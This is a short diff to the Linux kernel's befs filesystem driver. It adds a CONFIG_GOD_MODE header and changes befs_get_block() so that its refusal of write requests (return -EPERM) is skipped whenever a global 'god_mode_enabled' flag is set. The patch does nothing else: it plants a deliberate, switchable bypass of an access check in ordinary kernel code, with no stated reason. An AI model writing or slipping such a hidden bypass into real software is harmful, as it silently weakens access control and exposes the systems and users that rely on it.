@@ -1,3 +1,6 @@
+#ifdef CONFIG_GOD_MODE
+#include <linux/god_mode.h>
+#endif
 /*
  * linux/fs/befs/linuxvfs.c
  *
@@ -137,7 +140,15 @@ befs_get_block(struct inode *inode, sector_t block,
 	if (create) {
 		befs_error(sb, "befs_get_block() was asked to write to "
 			   "block %ld in inode %lu", block, inode->i_ino);
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 	}
 
 	res = befs_fblock2brun(sb, ds, block, &run);
